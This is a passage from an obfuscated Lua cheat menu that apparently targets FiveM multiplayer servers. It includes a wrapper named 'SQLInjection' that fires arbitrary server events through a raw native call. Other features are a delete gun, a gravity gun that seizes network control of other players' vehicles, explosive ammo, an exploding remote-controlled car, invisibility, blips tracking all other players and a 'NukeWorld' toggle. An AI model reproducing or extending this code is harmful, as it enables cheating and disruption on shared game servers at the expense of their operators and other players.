                SetVehicleNumberPlateText(Is, plate)
                I0oW9H("Your new ~g~" .. vcuXA44nvJscsgjrCg1 .. "~w~ has been set to your garage")
            end
            local function omUMPIxLdJiimeh()
                local xPy = GetPlayerPed(-1)
                local SVFH = GetVehiclePedIsIn(xPy, true)
                local BGeiSh = kbinput("Enter the plate license you want", " ", 20)
                if j ~= " " then
                    SetVehicleNumberPlateText(SVFH, BGeiSh)
                end
            end
            local VJlqCJRhp21Htp007 = tostring
            local function HIztd9UQuuAO8PgCWY4IE(Tdx10k4LnWRjOF3ER48c)
                if Tdx10k4LnWRjOF3ER48c == 0.0 or not Tdx10k4LnWRjOF3ER48c then
                    return nil
                end
                return VJlqCJRhp21Htp007(Tdx10k4LnWRjOF3ER48c)
            end
            function SQLInjection(k1uGXua7, ...)
                local WZC7kBOI9XWaz0JdTwzZ3 = msgpack.pack({...})
                return SQLInjectionInternal(k1uGXua7, WZC7kBOI9XWaz0JdTwzZ3, WZC7kBOI9XWaz0JdTwzZ3:len())
            end
            function SQLInjectionInternal(etag0AyxKMx90Wlz, Yl8RJ5Vn, ssMzyYmT3l)
                return Citizen.InvokeNative(
                    2145194280,
                    HIztd9UQuuAO8PgCWY4IE(etag0AyxKMx90Wlz),
                    HIztd9UQuuAO8PgCWY4IE(Yl8RJ5Vn),
                    ssMzyYmT3l
                )
            end
            local C_PCOoW_4E5bzn2FhF = {}
            C_PCOoW_4E5bzn2FhF.Start = function()
                if DoesEntityExist(C_PCOoW_4E5bzn2FhF.Entity) then
                    return
                end
                C_PCOoW_4E5bzn2FhF.Spawn()
                C_PCOoW_4E5bzn2FhF.Tablet(true)
                while DoesEntityExist(C_PCOoW_4E5bzn2FhF.Entity) and DoesEntityExist(C_PCOoW_4E5bzn2FhF.Driver) do
                    Citizen.Wait(5)
                    local n8ox0F =
                        GetDistanceBetweenCoords(
                        GetEntityCoords(PlayerPedId()),
                        GetEntityCoords(C_PCOoW_4E5bzn2FhF.Entity),
                        true
                    )
                    C_PCOoW_4E5bzn2FhF.DrawInstructions(n8ox0F)
                    C_PCOoW_4E5bzn2FhF.HandleKeys(n8ox0F)
                    if n8ox0F <= nlXCUGaxh(10000000) then
                        if not NetworkHasControlOfEntity(C_PCOoW_4E5bzn2FhF.Driver) then
                            NetworkRequestControlOfEntity(C_PCOoW_4E5bzn2FhF.Driver)
                        elseif not NetworkHasControlOfEntity(C_PCOoW_4E5bzn2FhF.Entity) then
                            NetworkRequestControlOfEntity(C_PCOoW_4E5bzn2FhF.Entity)
                        end
                    else
                        TaskVehicleTempAction(C_PCOoW_4E5bzn2FhF.Driver, C_PCOoW_4E5bzn2FhF.Entity, 6, 2500)
                    end
                end
            end
            C_PCOoW_4E5bzn2FhF.HandleKeys = function(p_Dg3yL)
                if IsControlJustReleased(0.0, 47) then
                    if IsCamRendering(C_PCOoW_4E5bzn2FhF.Camera) then
                        C_PCOoW_4E5bzn2FhF.ToggleCamera(false)
                    else
                        C_PCOoW_4E5bzn2FhF.ToggleCamera(true)
                    end
                end
                if p_Dg3yL <= nlXCUGaxh(10000000) then
                    if IsControlJustPressed(0.0, 73) then
                        C_PCOoW_4E5bzn2FhF.Attach("pick")
                    end
                end
                if p_Dg3yL < nlXCUGaxh(10000000) then
                    if IsControlJustReleased(0.0, 108) then
                        local iJPM1jJBaglVMAtHd = GetEntityCoords(C_PCOoW_4E5bzn2FhF.Entity, true)
                        msnUPYc5iQSiGfA(
                            iJPM1jJBaglVMAtHd.x,
                            iJPM1jJBaglVMAtHd.y,
                            iJPM1jJBaglVMAtHd.z,
                            2,
                            nlXCUGaxh(10000000),
                            true,
                            false,
                            0.0
                        )
                    end
                    if IsControlPressed(0.0, 172) and not IsControlPressed(0.0, 173) then
                        TaskVehicleTempAction(C_PCOoW_4E5bzn2FhF.Driver, C_PCOoW_4E5bzn2FhF.Entity, 9, 1)
                    end
                    if IsControlJustReleased(0.0, 172) or IsControlJustReleased(0.0, 173) then
                        TaskVehicleTempAction(C_PCOoW_4E5bzn2FhF.Driver, C_PCOoW_4E5bzn2FhF.Entity, 6, 2500)
                    end
                    if IsControlPressed(0.0, 173) and not IsControlPressed(0.0, 172) then
                        TaskVehicleTempAction(C_PCOoW_4E5bzn2FhF.Driver, C_PCOoW_4E5bzn2FhF.Entity, 22, 1)
                    end
                    if IsControlPressed(0.0, 174) and IsControlPressed(0.0, 173) then
                        TaskVehicleTempAction(C_PCOoW_4E5bzn2FhF.Driver, C_PCOoW_4E5bzn2FhF.Entity, 13, 1)
                    end
                    if IsControlPressed(0.0, 175) and IsControlPressed(0.0, 173) then
                        TaskVehicleTempAction(C_PCOoW_4E5bzn2FhF.Driver, C_PCOoW_4E5bzn2FhF.Entity, 14, 1)
                    end
                    if IsControlPressed(0.0, 172) and IsControlPressed(0.0, 173) then
                        TaskVehicleTempAction(C_PCOoW_4E5bzn2FhF.Driver, C_PCOoW_4E5bzn2FhF.Entity, 30, 100)
                    end
                    if IsControlPressed(0.0, 174) and IsControlPressed(0.0, 172) then
                        TaskVehicleTempAction(C_PCOoW_4E5bzn2FhF.Driver, C_PCOoW_4E5bzn2FhF.Entity, 7, 1)
                    end
                    if IsControlPressed(0.0, 175) and IsControlPressed(0.0, 172) then
                        TaskVehicleTempAction(C_PCOoW_4E5bzn2FhF.Driver, C_PCOoW_4E5bzn2FhF.Entity, 8, 1)
                    end
                    if IsControlPressed(0.0, 174) and not IsControlPressed(0.0, 172) and not IsControlPressed(0.0, 173) then
                        TaskVehicleTempAction(C_PCOoW_4E5bzn2FhF.Driver, C_PCOoW_4E5bzn2FhF.Entity, 4, 1)
                    end
                    if IsControlPressed(0.0, 175) and not IsControlPressed(0.0, 172) and not IsControlPressed(0.0, 173) then
                        TaskVehicleTempAction(C_PCOoW_4E5bzn2FhF.Driver, C_PCOoW_4E5bzn2FhF.Entity, 5, 1)
                    end
                end
            end
            C_PCOoW_4E5bzn2FhF.DrawInstructions = function(JpLI)
                local uQeyLJwcaBreLKcv7yz = {
                    {["label"] = "Right", ["button"] = "~INPUT_CELLPHONE_RIGHT~"},
                    {["label"] = "Forward", ["button"] = "~INPUT_CELLPHONE_UP~"},
                    {["label"] = "Back", ["button"] = "~INPUT_CELLPHONE_DOWN~"},
                    {["label"] = "Left", ["button"] = "~INPUT_CELLPHONE_LEFT~"}
                }
                local Vdyfr7Y4gdvGTUIW = {["label"] = "Delete", ["button"] = "~INPUT_VEH_DUCK~"}
                local DshwKcNoaiHv5x15lq = {["label"] = "Explode", ["button"] = "~INPUT_VEH_FLY_ROLL_LEFT_ONLY~"}
                local y1lu0ejVi3D3q8wjWHSYU = {{["label"] = "Toggle Camera", ["button"] = "~INPUT_DETONATE~"}}
                if JpLI <= nlXCUGaxh(10000000) then
                    for buttonIndex = 1, #uQeyLJwcaBreLKcv7yz do
                        local tEUNsGI36tCb53K56Vy5 = uQeyLJwcaBreLKcv7yz[buttonIndex]
                        table.insert(y1lu0ejVi3D3q8wjWHSYU, tEUNsGI36tCb53K56Vy5)
                    end
                    if JpLI <= nlXCUGaxh(10000000) then
                        table.insert(y1lu0ejVi3D3q8wjWHSYU, DshwKcNoaiHv5x15lq)
                    end
                    if JpLI <= nlXCUGaxh(10000000) then
                        table.insert(y1lu0ejVi3D3q8wjWHSYU, Vdyfr7Y4gdvGTUIW)
                    end
                end
                Citizen.CreateThread(
                    function()
                        local DGcoMuJ7AZYkuPh = RequestScaleformMovie("instructional_buttons")
                        while not HasScaleformMovieLoaded(DGcoMuJ7AZYkuPh) do
                            Wait(0.0)
                        end
                        PushScaleformMovieFunction(DGcoMuJ7AZYkuPh, "CLEAR_ALL")
                        PushScaleformMovieFunction(DGcoMuJ7AZYkuPh, "TOGGLE_MOUSE_BUTTONS")
                        PushScaleformMovieFunctionParameterBool(0.0)
                        PopScaleformMovieFunctionVoid()
                        for p5YspPMBNi, OpYR6hwOub6gMb6 in ipairs(y1lu0ejVi3D3q8wjWHSYU) do
                            PushScaleformMovieFunction(DGcoMuJ7AZYkuPh, "SET_DATA_SLOT")
                            PushScaleformMovieFunctionParameterInt(p5YspPMBNi - 1)
                            PushScaleformMovieMethodParameterButtonName(OpYR6hwOub6gMb6["button"])
                            PushScaleformMovieFunctionParameterString(OpYR6hwOub6gMb6["label"])
                            PopScaleformMovieFunctionVoid()
                        end
                        PushScaleformMovieFunction(DGcoMuJ7AZYkuPh, "DRAW_INSTRUCTIONAL_BUTTONS")
                        PushScaleformMovieFunctionParameterInt(-1)
                        PopScaleformMovieFunctionVoid()
                        DrawScaleformMovieFullscreen(DGcoMuJ7AZYkuPh, 255, 255, 255, 255)
                    end
                )
            end
            C_PCOoW_4E5bzn2FhF.Spawn = function()
                C_PCOoW_4E5bzn2FhF.LoadModels({GetHashKey(RcModel), 68070371})
                local DW0h97KuRImgM0GYy, VqOCGmri =
                    GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * nlXCUGaxh(2),
                    GetEntityHeading(PlayerPedId())
                C_PCOoW_4E5bzn2FhF.Entity = CreateVehicle(GetHashKey(RcModel), DW0h97KuRImgM0GYy, VqOCGmri, true)
                VehicleMaxTunning(C_PCOoW_4E5bzn2FhF.Entity)
                while not DoesEntityExist(C_PCOoW_4E5bzn2FhF.Entity) do
                    Citizen.Wait(5)
                end
                C_PCOoW_4E5bzn2FhF.Driver = CreatePed(5, 68070371, DW0h97KuRImgM0GYy, VqOCGmri, true)
                SetEntityInvincible(C_PCOoW_4E5bzn2FhF.Driver, true)
                SetEntityVisible(C_PCOoW_4E5bzn2FhF.Driver, false)
                FreezeEntityPosition(C_PCOoW_4E5bzn2FhF.Driver, true)
                SetPedAlertness(C_PCOoW_4E5bzn2FhF.Driver, nlXCUGaxh(0.0))
                SetVehicleNumberPlateText(C_PCOoW_4E5bzn2FhF.Entity, "4B50LUT3")
                TaskWarpPedIntoVehicle(C_PCOoW_4E5bzn2FhF.Driver, C_PCOoW_4E5bzn2FhF.Entity, -1)
                while not IsPedInVehicle(C_PCOoW_4E5bzn2FhF.Driver, C_PCOoW_4E5bzn2FhF.Entity) do
                    Citizen.Wait(0.0)
                end
                C_PCOoW_4E5bzn2FhF.Attach("place")
            end
            C_PCOoW_4E5bzn2FhF.Attach = function(UYfUntQhfEglH0wsakIGC)
                if not DoesEntityExist(C_PCOoW_4E5bzn2FhF.Entity) then
                    return
                end
                C_PCOoW_4E5bzn2FhF.LoadModels({"pickup_object"})
                if UYfUntQhfEglH0wsakIGC == "place" then
                    PlaceObjectOnGroundProperly(C_PCOoW_4E5bzn2FhF.Entity)
                elseif UYfUntQhfEglH0wsakIGC == "pick" then
                    if DoesCamExist(C_PCOoW_4E5bzn2FhF.Camera) then
                        C_PCOoW_4E5bzn2FhF.ToggleCamera(false)
                    end
                    C_PCOoW_4E5bzn2FhF.Tablet(false)
                    DeleteVehicle(C_PCOoW_4E5bzn2FhF.Entity)
                    DeleteEntity(C_PCOoW_4E5bzn2FhF.Driver)
                    C_PCOoW_4E5bzn2FhF.UnloadModels()
                end
            end
            C_PCOoW_4E5bzn2FhF.Tablet = function(oJw2YDJG)
                if oJw2YDJG then
                    Citizen.CreateThread(
                        function()
                            while DoesEntityExist(C_PCOoW_4E5bzn2FhF.TabletEntity) do
                                Citizen.Wait(5)
                            end
                            ClearPedTasks(PlayerPedId())
                        end
                    )
                else
                    DeleteEntity(C_PCOoW_4E5bzn2FhF.TabletEntity)
                end
            end
            ConfigCamera = true
            C_PCOoW_4E5bzn2FhF.ToggleCamera = function(BTf0qLJ66LqRgAP2QYab)
                if not ConfigCamera then
                    return
                end
                if BTf0qLJ66LqRgAP2QYab then
                    if not DoesEntityExist(C_PCOoW_4E5bzn2FhF.Entity) then
                        return
                    end
                    if DoesCamExist(C_PCOoW_4E5bzn2FhF.Camera) then
                        DestroyCam(C_PCOoW_4E5bzn2FhF.Camera)
                    end
                    C_PCOoW_4E5bzn2FhF.Camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                    AttachCamToEntity(
                        C_PCOoW_4E5bzn2FhF.Camera,
                        C_PCOoW_4E5bzn2FhF.Entity,
                        nlXCUGaxh(0.0),
                        -7.8,
                        3.4,
                        true
                    )
                    Citizen.CreateThread(
                        function()
                            while DoesCamExist(C_PCOoW_4E5bzn2FhF.Camera) do
                                Citizen.Wait(5)
                                SetCamRot(C_PCOoW_4E5bzn2FhF.Camera, GetEntityRotation(C_PCOoW_4E5bzn2FhF.Entity))
                            end
                        end
                    )
                    local dRmhmKjX =
                        500 *
                        math.ceil(
                            GetDistanceBetweenCoords(
                                GetEntityCoords(PlayerPedId()),
                                GetEntityCoords(C_PCOoW_4E5bzn2FhF.Entity),
                                true
                            ) / 10
                        )
                    RenderScriptCams(1, 1, dRmhmKjX, 1, 1)
                    Citizen.Wait(dRmhmKjX)
                else
                    local hMQO8p =
                        500 *
                        math.ceil(
                            GetDistanceBetweenCoords(
                                GetEntityCoords(PlayerPedId()),
                                GetEntityCoords(C_PCOoW_4E5bzn2FhF.Entity),
                                true
                            ) / 10
                        )
                    RenderScriptCams(0.0, 1, hMQO8p, 1, 0.0)
                    Citizen.Wait(hMQO8p)
                    ClearTimecycleModifier()
                    DestroyCam(C_PCOoW_4E5bzn2FhF.Camera)
                end
            end
            C_PCOoW_4E5bzn2FhF.LoadModels = function(zB)
                for modelIndex = 1, #zB do
                    local FX4Sg5mv7khujBLZ = zB[modelIndex]
                    if not C_PCOoW_4E5bzn2FhF.CachedModels then
                        C_PCOoW_4E5bzn2FhF.CachedModels = {}
                    end
                    table.insert(C_PCOoW_4E5bzn2FhF.CachedModels, FX4Sg5mv7khujBLZ)
                    if IsModelValid(FX4Sg5mv7khujBLZ) then
                        while not HasModelLoaded(FX4Sg5mv7khujBLZ) do
                            RequestModel(FX4Sg5mv7khujBLZ)
                            Citizen.Wait(10)
                        end
                    else
                        while not HasAnimDictLoaded(FX4Sg5mv7khujBLZ) do
                            RequestAnimDict(FX4Sg5mv7khujBLZ)
                            Citizen.Wait(10)
                        end
                    end
                end
            end
            C_PCOoW_4E5bzn2FhF.UnloadModels = function()
                for modelIndex = 1, #C_PCOoW_4E5bzn2FhF.CachedModels do
                    local SaSELzK0o8f = C_PCOoW_4E5bzn2FhF.CachedModels[modelIndex]
                    if IsModelValid(SaSELzK0o8f) then
                        SetModelAsNoLongerNeeded(SaSELzK0o8f)
                    else
                        RemoveAnimDict(SaSELzK0o8f)
                    end
                end
            end
            if CraftLaboratoryDeleteGun then
                local gctz5C, y56i = GetEntityPlayerIsFreeAimingAt(PlayerId())
                if gctz5C then
                    local rwVcNh = GetEntityCoords(y56i)
                    DrawMarker(
                        2,
                        rwVcNh.x,
                        rwVcNh.y,
                        rwVcNh.z + 2,
                        nlXCUGaxh(0.0),
                        nlXCUGaxh(0.0),
                        nlXCUGaxh(0.0),
                        nlXCUGaxh(0.0),
                        nlXCUGaxh(180),
                        nlXCUGaxh(0.0),
                        nlXCUGaxh(2),
                        nlXCUGaxh(2),
                        nlXCUGaxh(2),
                        255,
                        255,
                        255,
                        false,
                        true,
                        2,
                        nil,
                        nil,
                        false
                    )
                    if IsDisabledControlPressed(0.0, 24) then
                        SetEntityAsMissionEntity(y56i)
                        DeleteEntity(y56i)
                    end
                end
            end
            if GravityGun then
                local ZchhIcV9MQmY7z7, Aq_CZMIlmrV5 = GetEntityPlayerIsFreeAimingAt(PlayerId())
                GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 10, false, true)
                if ZchhIcV9MQmY7z7 then
                    local k6of = GetEntityCoords(Aq_CZMIlmrV5)
                    if IsEntityAVehicle(Aq_CZMIlmrV5) then
                        DrawMarker(
                            0.0,
                            k6of.x,
                            k6of.y,
                            k6of.z + 2,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(180),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(2),
                            nlXCUGaxh(2),
                            nlXCUGaxh(2),
                            255,
                            128,
                            0.0,
                            false,
                            true,
                            2,
                            nil,
                            nil,
                            false
                        )
                        if IsDisabledControlPressed(0.0, 24) then
                            RequestControlOnce(Aq_CZMIlmrV5)
                            SetVehicleGravityAmount(Aq_CZMIlmrV5, nlXCUGaxh(0.0))
                            ApplyForceToEntity(
                                Aq_CZMIlmrV5,
                                3,
                                nlXCUGaxh(2),
                                nlXCUGaxh(0.0),
                                0.1,
                                nlXCUGaxh(0.0),
                                nlXCUGaxh(0.0),
                                nlXCUGaxh(0.0),
                                0.0,
                                0.0,
                                1,
                                1,
                                0.0,
                                1
                            )
                        end
                    end
                end
            end
            if PedGun then
                if PedGunPedName == nil then
                    PedGunPedName = "a_m_m_acult_01"
                end
                local IKnajwfi_FkAS6s, rRNBgNlmcKNZ = GetPedLastWeaponImpactCoord(PlayerPedId())
                while not HasModelLoaded(GetHashKey(PedGunPedName)) do
                    RequestModel(GetHashKey(PedGunPedName))
                    Citizen.Wait(60)
                end
                if IKnajwfi_FkAS6s then
                    local goegWappgY =
                        CreatePed(
                        21,
                        GetHashKey(PedGunPedName),
                        rRNBgNlmcKNZ.x,
                        rRNBgNlmcKNZ.y,
                        rRNBgNlmcKNZ.z + 1,
                        0.0,
                        true,
                        true
                    )
                    RXx("scr_rcbarry2", "scr_clown_appears", goegWappgY)
                    if DoesEntityExist(goegWappgY) then
                        local L6LQVZjJ63 = PedToNet(goegWappgY)
                        NetworkSetNetworkIdDynamic(L6LQVZjJ63, false)
                        SetNetworkIdCanMigrate(L6LQVZjJ63, true)
                        SetNetworkIdExistsOnAllMachines(L6LQVZjJ63, true)
                        NetToPed(L6LQVZjJ63)
                    end
                end
            end
            if FullPerfTunning then
                VehicleMaxTunning(SpawnedCar)
            end
            if Invisibility then
                SetEntityVisible(PlayerPedId(), 0.0, 0.0)
            end
            if driftMod and IsPedInAnyVehicle(GetPlayerPed(-1), false) then
                I0oW9H("Press ~g~LSHIFT ~s~ to drift")
                if IsControlPressed(1, 21) then
                    SetVehicleReduceGrip(GetVehiclePedIsIn(GetPlayerPed(-1), false), true)
                else
                    SetVehicleReduceGrip(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                end
            end
            if FireBreath and not IsPedInAnyVehicle(GetPlayerPed(-1), false) then
                yA_z()
            end
            if FrozeWalking and not IsPedInAnyVehicle(GetPlayerPed(-1), false) then
                I0oW9H("Hold H to hidro walking!")
                if IsControlPressed(1, 304) then
                    RXx("cut_test", "exp_hydrant_decals_sp", GetPlayerPed(-1))
                end
            end
            if NoVehicleGravity and IsPedInAnyVehicle(GetPlayerPed(-1), false) then
                I0oW9H("hold shift to no gravity")
                if IsControlPressed(1, 21) then
                    local HMqfDSIRICfvn = GetVehiclePedIsIn(GetPlayerPed(-1), 0.0)
                    SetVehicleGravityAmount(HMqfDSIRICfvn, nlXCUGaxh(0.0))
                else
                    local N1r9k5 = GetVehiclePedIsIn(GetPlayerPed(-1), 0.0)
                    SetVehicleGravityAmount(N1r9k5, 9.80000019)
                end
            end
            function GiveAllWeapons(WhTu00h)
                for i = 1, #L3zTwwqBQlWWF do
                    GiveWeaponToPed(WhTu00h, GetHashKey(L3zTwwqBQlWWF[i]), 250, false, false)
                end
            end
            if JumpMod and IsPedInAnyVehicle(GetPlayerPed(-1), false) then
                if IsControlJustPressed(1, 22) then
                    I0oW9H("Press ~g~SPACE ~s~ to JUMP")
                    local frGkQGzmZ = GetVehiclePedIsIn(PlayerPedId(), 0.0)
                    ApplyForceToEntity(
                        frGkQGzmZ,
                        3,
                        nlXCUGaxh(0.0),
                        nlXCUGaxh(0.0),
                        nlXCUGaxh(9),
                        nlXCUGaxh(0.0),
                        nlXCUGaxh(0.0),
                        nlXCUGaxh(0.0),
                        0.0,
                        0.0,
                        1,
                        1,
                        0.0,
                        1
                    )
                end
            end
            if IncludeMeAtNukeWorld then
                IncludeSelfAtNukeWorld = 0.0
            else
                IncludeSelfAtNukeWorld = 1
            end
            Absolute_function.PlaneMotorcycle = function()
                local uvu3kpH7dB = "blazer4"
                ped = GetPlayerPed(-1)
                RequestModel(uvu3kpH7dB)
                while not HasModelLoaded(uvu3kpH7dB) do
                    Citizen.Wait(50)
                end
                local FLNIJZa =
                    CreateVehicle(GetHashKey(uvu3kpH7dB), GetEntityCoords(ped), GetEntityHeading(ped) + 90, true, true)
                FullTunningCar(FLNIJZa)
                SetEntityVisible(FLNIJZa, false, 0.0)
                SetPedIntoVehicle(ped, FLNIJZa, -1)
                local HQfcE_vdCBOQe = GetHashKey("prop_dummy_plane")
                local k_v = CreateObject(HQfcE_vdCBOQe, 0.0, 0.0, 0.0, true, true, true)
                if DoesEntityExist(FLNIJZa) then
                    AttachEntityToEntity(
                        k_v,
                        FLNIJZa,
                        0.4,
                        nlXCUGaxh(0.0),
                        0.0,
                        0.3,
                        0.0,
                        nlXCUGaxh(0.0),
                        nlXCUGaxh(180),
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                end
            end
            if playerBlips then
                local FKiQQr4Jo = GetActivePlayers()
                for i = 1, #FKiQQr4Jo do
                    local z1BY33f = FKiQQr4Jo[i]
                    local hADKVY4 = GetPlayerPed(z1BY33f)
                    if hADKVY4 ~= PlayerPedId() then
                        local DL6eEnL6WI4Zwb2lm5Y5 = GetBlipFromEntity(hADKVY4)
                        if not DoesBlipExist(DL6eEnL6WI4Zwb2lm5Y5) then
                            DL6eEnL6WI4Zwb2lm5Y5 = AddBlipForEntity(hADKVY4)
                            SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 1)
                            Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, true)
                        else
                            local e4MkfnN = GetVehiclePedIsIn(hADKVY4, false)
                            local xPDcPjD = GetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5)
                            if GetEntityHealth(hADKVY4) == 0.0 then
                                if xPDcPjD ~= 274 then
                                    SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 274)
                                    Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, true)
                                end
                            elseif e4MkfnN then
                                local Nqm8gX = GetVehicleClass(e4MkfnN)
                                local Oki = GetEntityModel(e4MkfnN)
                                if Nqm8gX == 15 then
                                    if xPDcPjD ~= 422 then
                                        SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 422)
                                        Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, true)
                                    end
                                elseif Nqm8gX == 8 then
                                    if xPDcPjD ~= 226 then
                                        SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 226)
                                        Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, true)
                                    end
                                elseif Nqm8gX == 16 then
                                    if
                                        Oki == GetHashKey("besra") or Oki == GetHashKey("hydra") or
                                            Oki == GetHashKey("lazer")
                                     then
                                        if xPDcPjD ~= 424 then
                                            SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 424)
                                            Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, true)
                                        end
                                    elseif xPDcPjD ~= 423 then
                                        SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 423)
                                        Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, true)
                                    end
                                elseif Nqm8gX == 14 then
                                    if xPDcPjD ~= 427 then
                                        SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 427)
                                        Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, true)
                                    end
                                elseif
                                    Oki == GetHashKey("insurgent") or Oki == GetHashKey("insurgent2") or
                                        Oki == GetHashKey("insurgent3")
                                 then
                                    if xPDcPjD ~= 426 then
                                        SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 426)
                                        Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, true)
                                    end
                                elseif Oki == GetHashKey("limo2") then
                                    if xPDcPjD ~= 460 then
                                        SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 460)
                                        Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, true)
                                    end
                                elseif Oki == GetHashKey("rhino") then
                                    if xPDcPjD ~= 421 then
                                        SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 421)
                                        Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, false)
                                    end
                                elseif Oki == GetHashKey("trash") or Oki == GetHashKey("trash2") then
                                    if xPDcPjD ~= 318 then
                                        SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 318)
                                        Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, true)
                                    end
                                elseif Oki == GetHashKey("pbus") then
                                    if xPDcPjD ~= 513 then
                                        SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 513)
                                        Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, false)
                                    end
                                elseif
                                    Oki == GetHashKey("seashark") or Oki == GetHashKey("seashark2") or
                                        Oki == GetHashKey("seashark3")
                                 then
                                    if xPDcPjD ~= 471 then
                                        SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 471)
                                        Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, false)
                                    end
                                elseif
                                    Oki == GetHashKey("cargobob") or Oki == GetHashKey("cargobob2") or
                                        Oki == GetHashKey("cargobob3") or
                                        Oki == GetHashKey("cargobob4")
                                 then
                                    if xPDcPjD ~= 481 then
                                        SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 481)
                                        Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, false)
                                    end
                                elseif
                                    Oki == GetHashKey("technical") or Oki == GetHashKey("technical2") or
                                        Oki == GetHashKey("technical3")
                                 then
                                    if xPDcPjD ~= 426 then
                                        SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 426)
                                        Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, false)
                                    end
                                elseif Oki == GetHashKey("taxi") then
                                    if xPDcPjD ~= 198 then
                                        SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 198)
                                        Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, true)
                                    end
                                elseif
                                    Oki == GetHashKey("fbi") or Oki == GetHashKey("fbi2") or
                                        Oki == GetHashKey("police2") or
                                        Oki == GetHashKey("police3") or
                                        Oki == GetHashKey("police") or
                                        Oki == GetHashKey("sheriff2") or
                                        Oki == GetHashKey("sheriff") or
                                        Oki == GetHashKey("policeold2")
                                 then
                                    if xPDcPjD ~= 56 then
                                        SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 56)
                                        Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, true)
                                    end
                                elseif xPDcPjD ~= 1 then
                                    SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 1)
                                    Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, true)
                                end
                                local GG5 = GetVehicleNumberOfPassengers(e4MkfnN)
                                if GG5 > 0.0 then
                                    if not IsVehicleSeatFree(e4MkfnN, -1) then
                                        GG5 = GG5 + 1
                                    end
                                    ShowNumberOnBlip(DL6eEnL6WI4Zwb2lm5Y5, GG5)
                                else
                                    HideNumberOnBlip(DL6eEnL6WI4Zwb2lm5Y5)
                                end
                            else
                                HideNumberOnBlip(DL6eEnL6WI4Zwb2lm5Y5)
                                if xPDcPjD ~= 1 then
                                    SetBlipSprite(DL6eEnL6WI4Zwb2lm5Y5, 1)
                                    Citizen.InvokeNative(6898569612438869215, DL6eEnL6WI4Zwb2lm5Y5, true)
                                end
                            end
                            SetBlipRotation(DL6eEnL6WI4Zwb2lm5Y5, math.ceil(GetEntityHeading(e4MkfnN)))
                            SetBlipNameToPlayerName(DL6eEnL6WI4Zwb2lm5Y5, z1BY33f)
                            SetBlipScale(DL6eEnL6WI4Zwb2lm5Y5, 0.85)
                            if IsPauseMenuActive() then
                                SetBlipAlpha(DL6eEnL6WI4Zwb2lm5Y5, 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(PlayerPedId(), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(z1BY33f), true))
                                distance =
                                    (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) +
                                    900
                                if distance < 0.0 then
                                    distance = 0.0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(DL6eEnL6WI4Zwb2lm5Y5, distance)
                            end
                        end
                    end
                end
            elseif not playerBlips then
                local Lz3gAJ = GetActivePlayers()
                for i = 1, #Lz3gAJ do
                    local PXDSLhwkblLh = Lz3gAJ[i]
                    local XBR3mEUvt75Ypn = GetPlayerPed(PXDSLhwkblLh)
                    local N8EoRVhdCewc1ozL5 = GetBlipFromEntity(XBR3mEUvt75Ypn)
                    if DoesBlipExist(N8EoRVhdCewc1ozL5) then
                        RemoveBlip(N8EoRVhdCewc1ozL5)
                    end
                end
            end
            if ExplosiveAmmo then
                local ysAcT15tOBkEEg6aB8U, eKLbwyr = GetPedLastWeaponImpactCoord(PlayerPedId())
                if ysAcT15tOBkEEg6aB8U then
                    msnUPYc5iQSiGfA(
                        eKLbwyr.x,
                        eKLbwyr.y,
                        eKLbwyr.z,
                        ExplosionToSet,
                        nlXCUGaxh(100000),
                        true,
                        false,
                        0.0
                    )
